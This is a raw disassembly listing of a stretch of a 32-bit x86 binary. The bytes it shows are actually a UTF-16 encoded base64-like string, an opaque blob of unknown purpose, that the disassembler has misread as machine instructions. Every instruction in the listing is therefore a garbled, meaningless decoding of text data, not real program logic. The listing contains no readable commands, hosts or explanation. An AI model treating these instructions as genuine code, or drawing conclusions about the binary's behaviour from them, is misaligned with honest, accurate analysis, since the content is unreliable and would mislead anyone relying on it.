  4072c7:	6c                   	insb   (%dx),%es:(%edi)
  4072c8:	00 36                	add    %dh,(%esi)
  4072ca:	00 5a 00             	add    %bl,0x0(%edx)
  4072cd:	77 00                	ja     0x4072cf
  4072cf:	74 00                	je     0x4072d1
  4072d1:	36 00 30             	add    %dh,%ss:(%eax)
  4072d4:	00 79 00             	add    %bh,0x0(%ecx)
  4072d7:	65 00 6f 00          	add    %ch,%gs:0x0(%edi)
  4072db:	6d                   	insl   (%dx),%es:(%edi)
  4072dc:	00 70 00             	add    %dh,0x0(%eax)
  4072df:	6a 00                	push   $0x0
  4072e1:	45                   	inc    %ebp
  4072e2:	00 57 00             	add    %dl,0x0(%edi)
  4072e5:	7a 00                	jp     0x4072e7
  4072e7:	41                   	inc    %ecx
  4072e8:	00 74 00 4d          	add    %dh,0x4d(%eax,%eax,1)
  4072ec:	00 63 00             	add    %ah,0x0(%ebx)
  4072ef:	5a                   	pop    %edx
  4072f0:	00 4c 00 6f          	add    %cl,0x6f(%eax,%eax,1)
  4072f4:	00 47 00             	add    %al,0x0(%edi)
  4072f7:	69 00 53 00 2b 00    	imul   $0x2b0053,(%eax),%eax
  4072fd:	2b 00                	sub    (%eax),%eax
  4072ff:	37                   	aaa
  407300:	00 70 00             	add    %dh,0x0(%eax)
  407303:	49                   	dec    %ecx
  407304:	00 71 00             	add    %dh,0x0(%ecx)
  407307:	7a 00                	jp     0x407309
  407309:	43                   	inc    %ebx
  40730a:	00 33                	add    %dh,(%ebx)
  40730c:	00 49 00             	add    %cl,0x0(%ecx)
  40730f:	7a 00                	jp     0x407311
  407311:	51                   	push   %ecx
  407312:	00 71 00             	add    %dh,0x0(%ecx)
  407315:	38 00                	cmp    %al,(%eax)
  407317:	77 00                	ja     0x407319
  407319:	30 00                	xor    %al,(%eax)
  40731b:	35 00 37 00 49       	xor    $0x49003700,%eax
  407320:	00 6d 00             	add    %ch,0x0(%ebp)
  407323:	36 00 44 00 62       	add    %al,%ss:0x62(%eax,%eax,1)
  407328:	00 37                	add    %dh,(%edi)
  40732a:	00 38                	add    %bh,(%eax)
  40732c:	00 46 00             	add    %al,0x0(%esi)
  40732f:	64 00 73 00          	add    %dh,%fs:0x0(%ebx)
  407333:	39 00                	cmp    %eax,(%eax)
  407335:	39 00                	cmp    %eax,(%eax)
  407337:	56                   	push   %esi
  407338:	00 45 00             	add    %al,0x0(%ebp)
  40733b:	73 00                	jae    0x40733d
  40733d:	49                   	dec    %ecx
  40733e:	00 45 00             	add    %al,0x0(%ebp)
  407341:	30 00                	xor    %al,(%eax)
  407343:	53                   	push   %ebx
  407344:	00 4c 00 47          	add    %cl,0x47(%eax,%eax,1)
  407348:	00 65 00             	add    %ah,0x0(%ebp)
  40734b:	66 00 74 00 39       	data16 add %dh,0x39(%eax,%eax,1)
  407350:	00 32                	add    %dh,(%edx)
  407352:	00 55 00             	add    %dl,0x0(%ebp)
  407355:	76 00                	jbe    0x407357
  407357:	39 00                	cmp    %eax,(%eax)
  407359:	69 00 30 00 39 00    	imul   $0x390030,(%eax),%eax
  40735f:	35 00 77 00 52       	xor    $0x52007700,%eax
  407364:	00 7a 00             	add    %bh,0x0(%edx)
  407367:	2f                   	das
  407368:	00 7a 00             	add    %bh,0x0(%edx)
  40736b:	2f                   	das
  40736c:	00 36                	add    %dh,(%esi)
  40736e:	00 43 00             	add    %al,0x0(%ebx)
  407371:	52                   	push   %edx
  407372:	00 5a 00             	add    %bl,0x0(%edx)
  407375:	6d                   	insl   (%dx),%es:(%edi)
  407376:	00 39                	add    %bh,(%ecx)
  407378:	00 37                	add    %dh,(%edi)
  40737a:	00 66 00             	add    %ah,0x0(%esi)
  40737d:	76 00                	jbe    0x40737f
  40737f:	42                   	inc    %edx
  407380:	00 55 00             	add    %dl,0x0(%ebp)
  407383:	6e                   	outsb  %ds:(%esi),(%dx)
  407384:	00 4e 00             	add    %cl,0x0(%esi)
  407387:	47                   	inc    %edi
  407388:	00 43 00             	add    %al,0x0(%ebx)
  40738b:	5a                   	pop    %edx
  40738c:	00 2f                	add    %ch,(%edi)
  40738e:	00 56 00             	add    %dl,0x0(%esi)
  407391:	44                   	inc    %esp
  407392:	00 67 00             	add    %ah,0x0(%edi)
  407395:	68 00 38 00 57       	push   $0x57003800
  40739a:	00 43 00             	add    %al,0x0(%ebx)
  40739d:	62 00                	bound  %eax,(%eax)
  40739f:	7a 00                	jp     0x4073a1
  4073a1:	70 00                	jo     0x4073a3
  4073a3:	51                   	push   %ecx
  4073a4:	00 68 00             	add    %ch,0x0(%eax)
  4073a7:	70 00                	jo     0x4073a9
  4073a9:	79 00                	jns    0x4073ab
  4073ab:	31 00                	xor    %eax,(%eax)
  4073ad:	70 00                	jo     0x4073af
  4073af:	55                   	push   %ebp
  4073b0:	00 47 00             	add    %al,0x0(%edi)
  4073b3:	53                   	push   %ebx
  4073b4:	00 48 00             	add    %cl,0x0(%eax)
  4073b7:	62 00                	bound  %eax,(%eax)
  4073b9:	66 00 68 00          	data16 add %ch,0x0(%eax)
  4073bd:	41                   	inc    %ecx
  4073be:	00 58 00             	add    %bl,0x0(%eax)
  4073c1:	6c                   	insb   (%dx),%es:(%edi)
  4073c2:	00 68 00             	add    %ch,0x0(%eax)
  4073c5:	30 00                	xor    %al,(%eax)
  4073c7:	59                   	pop    %ecx
  4073c8:	00 4a 00             	add    %cl,0x0(%edx)
  4073cb:	6b 00 65             	imul   $0x65,(%eax),%eax
  4073ce:	00 4e 00             	add    %cl,0x0(%esi)
  4073d1:	4f                   	dec    %edi
  4073d2:	00 7a 00             	add    %bh,0x0(%edx)
  4073d5:	63 00                	arpl   %eax,(%eax)
  4073d7:	36 00 61 00          	add    %ah,%ss:0x0(%ecx)
  4073db:	4d                   	dec    %ebp
  4073dc:	00 46 00             	add    %al,0x0(%esi)
  4073df:	4a                   	dec    %edx
  4073e0:	00 75 00             	add    %dh,0x0(%ebp)
  4073e3:	76 00                	jbe    0x4073e5
  4073e5:	63 00                	arpl   %eax,(%eax)
  4073e7:	36 00 63 00          	add    %ah,%ss:0x0(%ebx)
  4073eb:	33 00                	xor    (%eax),%eax
  4073ed:	67 00 59 00          	add    %bl,0x0(%bx,%di)
  4073f1:	61                   	popa
  4073f2:	00 79 00             	add    %bh,0x0(%ecx)
  4073f5:	55                   	push   %ebp
  4073f6:	00 77 00             	add    %dh,0x0(%edi)
  4073f9:	4b                   	dec    %ebx
  4073fa:	00 7a 00             	add    %bh,0x0(%edx)
  4073fd:	77 00                	ja     0x4073ff
  4073ff:	58                   	pop    %eax
  407400:	00 7a 00             	add    %bh,0x0(%edx)
  407403:	5a                   	pop    %edx
  407404:	00 47 00             	add    %al,0x0(%edi)
  407407:	6e                   	outsb  %ds:(%esi),(%dx)
  407408:	00 2b                	add    %ch,(%ebx)
  40740a:	00 37                	add    %dh,(%edi)
  40740c:	00 70 00             	add    %dh,0x0(%eax)
  40740f:	6f                   	outsl  %ds:(%esi),(%dx)
  407410:	00 52 00             	add    %dl,0x0(%edx)
  407413:	2f                   	das
  407414:	00 53 00             	add    %dl,0x0(%ebx)
  407417:	50                   	push   %eax
  407418:	00 7a 00             	add    %bh,0x0(%edx)
  40741b:	61                   	popa
  40741c:	00 76 00             	add    %dh,0x0(%esi)
  40741f:	4c                   	dec    %esp
  407420:	00 53 00             	add    %dl,0x0(%ebx)
  407423:	75 00                	jne    0x407425
  407425:	6b 00 36             	imul   $0x36,(%eax),%eax
  407428:	00 65 00             	add    %ah,0x0(%ebp)
  40742b:	49                   	dec    %ecx
  40742c:	00 47 00             	add    %al,0x0(%edi)
  40742f:	30 00                	xor    %al,(%eax)
  407431:	4c                   	dec    %esp
  407432:	00 66 00             	add    %ah,0x0(%esi)
  407435:	48                   	dec    %eax
  407436:	00 6d 00             	add    %ch,0x0(%ebp)
  407439:	6d                   	insl   (%dx),%es:(%edi)
  40743a:	00 43 00             	add    %al,0x0(%ebx)
  40743d:	44                   	inc    %esp
  40743e:	00 47 00             	add    %al,0x0(%edi)
  407441:	6d                   	insl   (%dx),%es:(%edi)
  407442:	00 4b 00             	add    %cl,0x0(%ebx)
  407445:	59                   	pop    %ecx
  407446:	00 4a 00             	add    %cl,0x0(%edx)
  407449:	33 00                	xor    (%eax),%eax
  40744b:	2b 00                	sub    (%eax),%eax
  40744d:	53                   	push   %ebx
  40744e:	00 74 00 2b          	add    %dh,0x2b(%eax,%eax,1)
  407452:	00 51 00             	add    %dl,0x0(%ecx)
  407455:	62 00                	bound  %eax,(%eax)
  407457:	42                   	inc    %edx
  407458:	00 6f 00             	add    %ch,0x0(%edi)
  40745b:	48                   	dec    %eax
  40745c:	00 57 00             	add    %dl,0x0(%edi)
  40745f:	6b 00 4e             	imul   $0x4e,(%eax),%eax
  407462:	00 74 00 75          	add    %dh,0x75(%eax,%eax,1)
  407466:	00 62 00             	add    %ah,0x0(%edx)
  407469:	74 00                	je     0x40746b
  40746b:	71 00                	jno    0x40746d
  40746d:	69 00 34 00 56 00    	imul   $0x560034,(%eax),%eax
  407473:	45                   	inc    %ebp
  407474:	00 6b 00             	add    %ch,0x0(%ebx)
  407477:	35 00 67 00 6d       	xor    $0x6d006700,%eax
  40747c:	00 31                	add    %dh,(%ecx)
  40747e:	00 4d 00             	add    %cl,0x0(%ebp)
  407481:	48                   	dec    %eax
  407482:	00 44 00 64          	add    %al,0x64(%eax,%eax,1)
  407486:	00 2f                	add    %ch,(%edi)
  407488:	00 50 00             	add    %dl,0x0(%eax)
  40748b:	73 00                	jae    0x40748d
  40748d:	67 00 49 00          	add    %cl,0x0(%bx,%di)
  407491:	50                   	push   %eax
  407492:	00 41 00             	add    %al,0x0(%ecx)
  407495:	7a 00                	jp     0x407497
  407497:	6e                   	outsb  %ds:(%esi),(%dx)
  407498:	00 36                	add    %dh,(%esi)
  40749a:	00 73 00             	add    %dh,0x0(%ebx)
  40749d:	71 00                	jno    0x40749f
  40749f:	34 00                	xor    $0x0,%al
  4074a1:	6f                   	outsl  %ds:(%esi),(%dx)
  4074a2:	00 33                	add    %dh,(%ebx)
  4074a4:	00 64 00 46          	add    %ah,0x46(%eax,%eax,1)
  4074a8:	00 6a 00             	add    %ch,0x0(%edx)
  4074ab:	79 00                	jns    0x4074ad
  4074ad:	33 00                	xor    (%eax),%eax
  4074af:	36 00 74 00 49       	add    %dh,%ss:0x49(%eax,%eax,1)
  4074b4:	00 72 00             	add    %dh,0x0(%edx)
  4074b7:	46                   	inc    %esi
  4074b8:	00 55 00             	add    %dl,0x0(%ebp)
  4074bb:	79 00                	jns    0x4074bd
  4074bd:	41                   	inc    %ecx
  4074be:	00 56 00             	add    %dl,0x0(%esi)
  4074c1:	4f                   	dec    %edi
  4074c2:	00 74 00 47          	add    %dh,0x47(%eax,%eax,1)
  4074c6:	00 41 00             	add    %al,0x0(%ecx)
  4074c9:	4b                   	dec    %ebx
  4074ca:	00 56 00             	add    %dl,0x0(%esi)
  4074cd:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  4074d1:	64 00 68 00          	add    %ch,%fs:0x0(%eax)
  4074d5:	63 00                	arpl   %eax,(%eax)
  4074d7:	6a 00                	push   $0x0
  4074d9:	48                   	dec    %eax
  4074da:	00 71 00             	add    %dh,0x0(%ecx)
  4074dd:	50                   	push   %eax
  4074de:	00 62 00             	add    %ah,0x0(%edx)
  4074e1:	48                   	dec    %eax
  4074e2:	00 50 00             	add    %dl,0x0(%eax)
  4074e5:	48                   	dec    %eax
  4074e6:	00 73 00             	add    %dh,0x0(%ebx)
  4074e9:	6b 00 62             	imul   $0x62,(%eax),%eax
  4074ec:	00 57 00             	add    %dl,0x0(%edi)
  4074ef:	7a 00                	jp     0x4074f1
  4074f1:	32 00                	xor    (%eax),%al
  4074f3:	48                   	dec    %eax
  4074f4:	00 53 00             	add    %dl,0x0(%ebx)
  4074f7:	37                   	aaa
  4074f8:	00 4e 00             	add    %cl,0x0(%esi)
  4074fb:	31 00                	xor    %eax,(%eax)
  4074fd:	38 00                	cmp    %al,(%eax)
  4074ff:	71 00                	jno    0x407501
  407501:	72 00                	jb     0x407503
  407503:	41                   	inc    %ecx
  407504:	00 47 00             	add    %al,0x0(%edi)
  407507:	7a 00                	jp     0x407509
  407509:	49                   	dec    %ecx
  40750a:	00 43 00             	add    %al,0x0(%ebx)
  40750d:	71 00                	jno    0x40750f
  40750f:	5a                   	pop    %edx
  407510:	00 36                	add    %dh,(%esi)
  407512:	00 75 00             	add    %dh,0x0(%ebp)
  407515:	65 00 4e 00          	add    %cl,%gs:0x0(%esi)
  407519:	73 00                	jae    0x40751b
  40751b:	36 00 73 00          	add    %dh,%ss:0x0(%ebx)
  40751f:	46                   	inc    %esi
  407520:	00 76 00             	add    %dh,0x0(%esi)
  407523:	71 00                	jno    0x407525
  407525:	47                   	inc    %edi
  407526:	00 36                	add    %dh,(%esi)
  407528:	00 53 00             	add    %dl,0x0(%ebx)
  40752b:	4b                   	dec    %ebx
  40752c:	00 61 00             	add    %ah,0x0(%ecx)
  40752f:	46                   	inc    %esi
  407530:	00 72 00             	add    %dh,0x0(%edx)
  407533:	33 00                	xor    (%eax),%eax
  407535:	4f                   	dec    %edi
  407536:	00 7a 00             	add    %bh,0x0(%edx)
  407539:	63 00                	arpl   %eax,(%eax)
  40753b:	78 00                	js     0x40753d
  40753d:	63 00                	arpl   %eax,(%eax)
  40753f:	71 00                	jno    0x407541
  407541:	74 00                	je     0x407543
  407543:	59                   	pop    %ecx
  407544:	00 38                	add    %bh,(%eax)
  407546:	00 5a 00             	add    %bl,0x0(%edx)
  407549:	6f                   	outsl  %ds:(%esi),(%dx)
  40754a:	00 6e 00             	add    %ch,0x0(%esi)
  40754d:	6e                   	outsb  %ds:(%esi),(%dx)
  40754e:	00 45 00             	add    %al,0x0(%ebp)
  407551:	30 00                	xor    %al,(%eax)
  407553:	35 00 37 00 79       	xor    $0x79003700,%eax
  407558:	00 37                	add    %dh,(%edi)
  40755a:	00 5a 00             	add    %bl,0x0(%edx)
  40755d:	6d                   	insl   (%dx),%es:(%edi)
  40755e:	00 47 00             	add    %al,0x0(%edi)
  407561:	6c                   	insb   (%dx),%es:(%edi)
  407562:	00 77 00             	add    %dh,0x0(%edi)
  407565:	33 00                	xor    (%eax),%eax
  407567:	45                   	inc    %ebp
  407568:	00 51 00             	add    %dl,0x0(%ecx)
  40756b:	53                   	push   %ebx
  40756c:	00 43 00             	add    %al,0x0(%ebx)
  40756f:	79 00                	jns    0x407571
  407571:	67 00 67 00          	add    %ah,0x0(%bx)
  407575:	6a 00                	push   $0x0
  407577:	73 00                	jae    0x407579
  407579:	35 00 76 00 4d       	xor    $0x4d007600,%eax
  40757e:	00 33                	add    %dh,(%ebx)
  407580:	00 31                	add    %dh,(%ecx)
  407582:	00 45 00             	add    %al,0x0(%ebp)
  407585:	45                   	inc    %ebp
  407586:	00 73 00             	add    %dh,0x0(%ebx)
  407589:	54                   	push   %esp
  40758a:	00 4a 00             	add    %cl,0x0(%edx)
  40758d:	46                   	inc    %esi
  40758e:	00 6f 00             	add    %ch,0x0(%edi)
  407591:	72 00                	jb     0x407593
  407593:	5a                   	pop    %edx
  407594:	00 4c 00 4b          	add    %cl,0x4b(%eax,%eax,1)
  407598:	00 54 00 53          	add    %dl,0x53(%eax,%eax,1)
  40759c:	00 6c 00 6d          	add    %ch,0x6d(%eax,%eax,1)
  4075a0:	00 77 00             	add    %dh,0x0(%edi)
  4075a3:	51                   	push   %ecx
  4075a4:	00 71 00             	add    %dh,0x0(%ecx)
  4075a7:	70 00                	jo     0x4075a9
  4075a9:	31 00                	xor    %eax,(%eax)
  4075ab:	4e                   	dec    %esi
  4075ac:	00 4b 00             	add    %cl,0x0(%ebx)
  4075af:	79 00                	jns    0x4075b1
  4075b1:	62 00                	bound  %eax,(%eax)
  4075b3:	52                   	push   %edx
  4075b4:	00 51 00             	add    %dl,0x0(%ecx)
  4075b7:	50                   	push   %eax
  4075b8:	00 44 00 78          	add    %al,0x78(%eax,%eax,1)
  4075bc:	00 64 00 45          	add    %ah,0x45(%eax,%eax,1)
  4075c0:	00 4d 00             	add    %cl,0x0(%ebp)
  4075c3:	56                   	push   %esi
  4075c4:	00 4c 00 54          	add    %cl,0x54(%eax,%eax,1)
  4075c8:	00 7a 00             	add    %bh,0x0(%edx)
  4075cb:	47                   	inc    %edi
  4075cc:	00 57 00             	add    %dl,0x0(%edi)
  4075cf:	42                   	inc    %edx
  4075d0:	00 42 00             	add    %al,0x0(%edx)
  4075d3:	30 00                	xor    %al,(%eax)
  4075d5:	41                   	inc    %ecx
  4075d6:	00 46 00             	add    %al,0x0(%esi)
  4075d9:	4e                   	dec    %esi
  4075da:	00 59 00             	add    %bl,0x0(%ecx)
  4075dd:	30 00                	xor    %al,(%eax)
  4075df:	49                   	dec    %ecx
  4075e0:	00 75 00             	add    %dh,0x0(%ebp)
  4075e3:	71 00                	jno    0x4075e5
  4075e5:	70 00                	jo     0x4075e7
  4075e7:	7a 00                	jp     0x4075e9
  4075e9:	70 00                	jo     0x4075eb
  4075eb:	64 00 6f 00          	add    %ch,%fs:0x0(%edi)
  4075ef:	6f                   	outsl  %ds:(%esi),(%dx)
  4075f0:	00 59 00             	add    %bl,0x0(%ecx)
  4075f3:	41                   	inc    %ecx
  4075f4:	00 39                	add    %bh,(%ecx)
  4075f6:	00 49 00             	add    %cl,0x0(%ecx)
  4075f9:	79 00                	jns    0x4075fb
  4075fb:	54                   	push   %esp
  4075fc:	00 45 00             	add    %al,0x0(%ebp)
  4075ff:	59                   	pop    %ecx
  407600:	00 55 00             	add    %dl,0x0(%ebp)
  407603:	4c                   	dec    %esp
  407604:	00 4d 00             	add    %cl,0x0(%ebp)
  407607:	67 00 58 00          	add    %bl,0x0(%bx,%si)
  40760b:	63 00                	arpl   %eax,(%eax)
  40760d:	78 00                	js     0x40760f
  40760f:	2f                   	das
  407610:	00 70 00             	add    %dh,0x0(%eax)
  407613:	7a 00                	jp     0x407615
  407615:	43                   	inc    %ebx
  407616:	00 65 00             	add    %ah,0x0(%ebp)
  407619:	36 00 61 00          	add    %ah,%ss:0x0(%ecx)
  40761d:	70 00                	jo     0x40761f
  40761f:	79 00                	jns    0x407621
  407621:	35 00 59 00 6a       	xor    $0x6a005900,%eax
  407626:	00 75 00             	add    %dh,0x0(%ebp)
  407629:	45                   	inc    %ebp
  40762a:	00 6b 00             	add    %ch,0x0(%ebx)
  40762d:	43                   	inc    %ebx
  40762e:	00 6d 00             	add    %ch,0x0(%ebp)
  407631:	31 00                	xor    %eax,(%eax)
  407633:	4c                   	dec    %esp
  407634:	00 75 00             	add    %dh,0x0(%ebp)
  407637:	66 00 73 00          	data16 add %dh,0x0(%ebx)
  40763b:	77 00                	ja     0x40763d
  40763d:	34 00                	xor    $0x0,%al
  40763f:	32 00                	xor    (%eax),%al
  407641:	46                   	inc    %esi
  407642:	00 61 00             	add    %ah,0x0(%ecx)
  407645:	6a 00                	push   $0x0
  407647:	74 00                	je     0x407649
  407649:	55                   	push   %ebp
  40764a:	00 52 00             	add    %dl,0x0(%edx)
  40764d:	77 00                	ja     0x40764f
  40764f:	48                   	dec    %eax
  407650:	00 4f 00             	add    %cl,0x0(%edi)
  407653:	67 00 55 00          	add    %dl,0x0(%di)
  407657:	62 00                	bound  %eax,(%eax)
  407659:	74 00                	je     0x40765b
  40765b:	56                   	push   %esi
  40765c:	00 37                	add    %dh,(%edi)
  40765e:	00 41 00             	add    %al,0x0(%ecx)
  407661:	47                   	inc    %edi
  407662:	00 61 00             	add    %ah,0x0(%ecx)
  407665:	6b 00 62             	imul   $0x62,(%eax),%eax
  407668:	00 7a 00             	add    %bh,0x0(%edx)
  40766b:	76 00                	jbe    0x40766d
  40766d:	48                   	dec    %eax
  40766e:	00 4e 00             	add    %cl,0x0(%esi)
  407671:	57                   	push   %edi
  407672:	00 78 00             	add    %bh,0x0(%eax)
  407675:	50                   	push   %eax
  407676:	00 6f 00             	add    %ch,0x0(%edi)
  407679:	2f                   	das
  40767a:	00 31                	add    %dh,(%ecx)
  40767c:	00 36                	add    %dh,(%esi)
  40767e:	00 42 00             	add    %al,0x0(%edx)
  407681:	57                   	push   %edi
  407682:	00 59 00             	add    %bl,0x0(%ecx)
  407685:	73 00                	jae    0x407687
  407687:	74 00                	je     0x407689
  407689:	58                   	pop    %eax
  40768a:	00 47 00             	add    %al,0x0(%edi)
  40768d:	74 00                	je     0x40768f
  40768f:	49                   	dec    %ecx
  407690:	00 6c 00 39          	add    %ch,0x39(%eax,%eax,1)
  407694:	00 38                	add    %bh,(%eax)
  407696:	00 38                	add    %bh,(%eax)
  407698:	00 37                	add    %dh,(%edi)
  40769a:	00 79 00             	add    %bh,0x0(%ecx)
  40769d:	51                   	push   %ecx
  40769e:	00 30                	add    %dh,(%eax)
  4076a0:	00 4c 00 4f          	add    %cl,0x4f(%eax,%eax,1)
  4076a4:	00 52 00             	add    %dl,0x0(%edx)
  4076a7:	35 00 51 00 54       	xor    $0x54005100,%eax
  4076ac:	00 59 00             	add    %bl,0x0(%ecx)
  4076af:	6b 00 79             	imul   $0x79,(%eax),%eax
  4076b2:	00 41 00             	add    %al,0x0(%ecx)
  4076b5:	32 00                	xor    (%eax),%al
  4076b7:	75 00                	jne    0x4076b9
  4076b9:	48                   	dec    %eax
  4076ba:	00 31                	add    %dh,(%ecx)
  4076bc:	00 57 00             	add    %dl,0x0(%edi)
  4076bf:	30 00                	xor    %al,(%eax)
  4076c1:	63 00                	arpl   %eax,(%eax)
  4076c3:	33 00                	xor    (%eax),%eax
  4076c5:	68 00 63 00 72       	push   $0x72006300
  4076ca:	00 4a 00             	add    %cl,0x0(%edx)
  4076cd:	43                   	inc    %ebx
  4076ce:	00 4a 00             	add    %cl,0x0(%edx)
  4076d1:	56                   	push   %esi
  4076d2:	00 44 00 50          	add    %al,0x50(%eax,%eax,1)
  4076d6:	00 73 00             	add    %dh,0x0(%ebx)
  4076d9:	2b 00                	sub    (%eax),%eax
  4076db:	56                   	push   %esi
  4076dc:	00 77 00             	add    %dh,0x0(%edi)
  4076df:	2b 00                	sub    (%eax),%eax
  4076e1:	46                   	inc    %esi
  4076e2:	00 75 00             	add    %dh,0x0(%ebp)
  4076e5:	6a 00                	push   $0x0
  4076e7:	70 00                	jo     0x4076e9
  4076e9:	4d                   	dec    %ebp
  4076ea:	00 48 00             	add    %cl,0x0(%eax)
  4076ed:	30 00                	xor    %al,(%eax)
  4076ef:	69 00 35 00 4a 00    	imul   $0x4a0035,(%eax),%eax
  4076f5:	67 00 71 00          	add    %dh,0x0(%bx,%di)
  4076f9:	44                   	inc    %esp
  4076fa:	00 41 00             	add    %al,0x0(%ecx)
  4076fd:	55                   	push   %ebp
  4076fe:	00 45 00             	add    %al,0x0(%ebp)
  407701:	33 00                	xor    (%eax),%eax
  407703:	45                   	inc    %ebp
  407704:	00 38                	add    %bh,(%eax)
  407706:	00 64 00 64          	add    %ah,0x64(%eax,%eax,1)
  40770a:	00 63 00             	add    %ah,0x0(%ebx)
  40770d:	59                   	pop    %ecx
  40770e:	00 45 00             	add    %al,0x0(%ebp)
  407711:	56                   	push   %esi
  407712:	00 2b                	add    %ch,(%ebx)
  407714:	00 4f 00             	add    %cl,0x0(%edi)
  407717:	61                   	popa
  407718:	00 35 00 42 00 41    	add    %dh,0x41004200
  40771e:	00 36                	add    %dh,(%esi)
  407720:	00 48 00             	add    %cl,0x0(%eax)
  407723:	33 00                	xor    (%eax),%eax
  407725:	78 00                	js     0x407727
  407727:	4a                   	dec    %edx
  407728:	00 48 00             	add    %cl,0x0(%eax)
  40772b:	65 00 6a 00          	add    %ch,%gs:0x0(%edx)
  40772f:	4e                   	dec    %esi
  407730:	00 6d 00             	add    %ch,0x0(%ebp)
  407733:	70 00                	jo     0x407735
  407735:	5a                   	pop    %edx
  407736:	00 39                	add    %bh,(%ecx)
  407738:	00 6e 00             	add    %ch,0x0(%esi)
  40773b:	42                   	inc    %edx
  40773c:	00 52 00             	add    %dl,0x0(%edx)
  40773f:	77 00                	ja     0x407741
  407741:	4f                   	dec    %edi
  407742:	00 62 00             	add    %ah,0x0(%edx)
  407745:	35 00 45 00 51       	xor    $0x51004500,%eax
  40774a:	00 43 00             	add    %al,0x0(%ebx)
  40774d:	79 00                	jns    0x40774f
  40774f:	69 00 35 00 4d 00    	imul   $0x4d0035,(%eax),%eax
  407755:	6f                   	outsl  %ds:(%esi),(%dx)
  407756:	00 62 00             	add    %ah,0x0(%edx)
  407759:	57                   	push   %edi
  40775a:	00 61 00             	add    %ah,0x0(%ecx)
  40775d:	75 00                	jne    0x40775f
  40775f:	4a                   	dec    %edx
  407760:	00 78 00             	add    %bh,0x0(%eax)
  407763:	61                   	popa
  407764:	00 6e 00             	add    %ch,0x0(%esi)
  407767:	64 00 71 00          	add    %dh,%fs:0x0(%ecx)
  40776b:	35 00 55 00 76       	xor    $0x76005500,%eax
  407770:	00 6e 00             	add    %ch,0x0(%esi)
  407773:	6e                   	outsb  %ds:(%esi),(%dx)
  407774:	00 57 00             	add    %dl,0x0(%edi)
  407777:	4d                   	dec    %ebp
  407778:	00 30                	add    %dh,(%eax)
  40777a:	00 4e 00             	add    %cl,0x0(%esi)
  40777d:	55                   	push   %ebp
  40777e:	00 53 00             	add    %dl,0x0(%ebx)
  407781:	6e                   	outsb  %ds:(%esi),(%dx)
  407782:	00 57 00             	add    %dl,0x0(%edi)
  407785:	6a 00                	push   $0x0
  407787:	43                   	inc    %ebx
  407788:	00 54 00 4f          	add    %dl,0x4f(%eax,%eax,1)
  40778c:	00 37                	add    %dh,(%edi)
  40778e:	00 71 00             	add    %dh,0x0(%ecx)
  407791:	52                   	push   %edx
  407792:	00 50 00             	add    %dl,0x0(%eax)
  407795:	7a 00                	jp     0x407797
  407797:	59                   	pop    %ecx
  407798:	00 37                	add    %dh,(%edi)
  40779a:	00 59 00             	add    %bl,0x0(%ecx)
  40779d:	43                   	inc    %ebx
  40779e:	00 48 00             	add    %cl,0x0(%eax)
  4077a1:	50                   	push   %eax
  4077a2:	00 48 00             	add    %cl,0x0(%eax)
  4077a5:	30 00                	xor    %al,(%eax)
  4077a7:	63 00                	arpl   %eax,(%eax)
  4077a9:	45                   	inc    %ebp
  4077aa:	00 7a 00             	add    %bh,0x0(%edx)
  4077ad:	75 00                	jne    0x4077af
  4077af:	38 00                	cmp    %al,(%eax)
  4077b1:	55                   	push   %ebp
  4077b2:	00 5a 00             	add    %bl,0x0(%edx)
  4077b5:	32 00                	xor    (%eax),%al
  4077b7:	56                   	push   %esi
  4077b8:	00 6a 00             	add    %ch,0x0(%edx)
  4077bb:	30 00                	xor    %al,(%eax)
  4077bd:	78 00                	js     0x4077bf
  4077bf:	67 00 6a 00          	add    %ch,0x0(%bp,%si)
  4077c3:	62 00                	bound  %eax,(%eax)
  4077c5:	6b 00 62             	imul   $0x62,(%eax),%eax
  4077c8:	00 75 00             	add    %dh,0x0(%ebp)
  4077cb:	6e                   	outsb  %ds:(%esi),(%dx)
  4077cc:	00 6e 00             	add    %ch,0x0(%esi)
  4077cf:	4e                   	dec    %esi
  4077d0:	00 35 00 73 00 61    	add    %dh,0x61007300
  4077d6:	00 46 00             	add    %al,0x0(%esi)
  4077d9:	72 00                	jb     0x4077db
  4077db:	69 00 58 00 33 00    	imul   $0x330058,(%eax),%eax
  4077e1:	59                   	pop    %ecx
  4077e2:	00 34 00             	add    %dh,(%eax,%eax,1)
  4077e5:	4a                   	dec    %edx
  4077e6:	00 69 00             	add    %ch,0x0(%ecx)
  4077e9:	68 00 4c 00 73       	push   $0x73004c00
  4077ee:	00 6b 00             	add    %ch,0x0(%ebx)
  4077f1:	66 00 57 00          	data16 add %dl,0x0(%edi)
  4077f5:	56                   	push   %esi
  4077f6:	00 77 00             	add    %dh,0x0(%edi)
  4077f9:	63 00                	arpl   %eax,(%eax)
  4077fb:	34 00                	xor    $0x0,%al
  4077fd:	7a 00                	jp     0x4077ff
  4077ff:	74 00                	je     0x407801
  407801:	68 00 6a 00 42       	push   $0x42006a00
  407806:	00 56 00             	add    %dl,0x0(%esi)
  407809:	66 00 34 00          	data16 add %dh,(%eax,%eax,1)
  40780d:	69 00 69 00 6b 00    	imul   $0x6b0069,(%eax),%eax
  407813:	4d                   	dec    %ebp
  407814:	00 66 00             	add    %ah,0x0(%esi)
  407817:	61                   	popa
  407818:	00 57 00             	add    %dl,0x0(%edi)
  40781b:	74 00                	je     0x40781d
  40781d:	69 00 30 00 30 00    	imul   $0x300030,(%eax),%eax
  407823:	6a 00                	push   $0x0
  407825:	6f                   	outsl  %ds:(%esi),(%dx)
  407826:	00 31                	add    %dh,(%ecx)
  407828:	00 7a 00             	add    %bh,0x0(%edx)
  40782b:	47                   	inc    %edi
  40782c:	00 57 00             	add    %dl,0x0(%edi)
  40782f:	47                   	inc    %edi
  407830:	00 54 00 57          	add    %dl,0x57(%eax,%eax,1)
  407834:	00 6b 00             	add    %ch,0x0(%ebx)
  407837:	4e                   	dec    %esi
  407838:	00 6e 00             	add    %ch,0x0(%esi)
  40783b:	68 00 2b 00 46       	push   $0x46002b00
  407840:	00 68 00             	add    %ch,0x0(%eax)
  407843:	62 00                	bound  %eax,(%eax)
  407845:	33 00                	xor    (%eax),%eax
  407847:	56                   	push   %esi
  407848:	00 70 00             	add    %dh,0x0(%eax)
  40784b:	2b 00                	sub    (%eax),%eax
  40784d:	69 00 5a 00 52 00    	imul   $0x52005a,(%eax),%eax
  407853:	49                   	dec    %ecx
  407854:	00 5a 00             	add    %bl,0x0(%edx)
  407857:	64 00 7a 00          	add    %bh,%fs:0x0(%edx)
  40785b:	35 00 74 00 54       	xor    $0x54007400,%eax
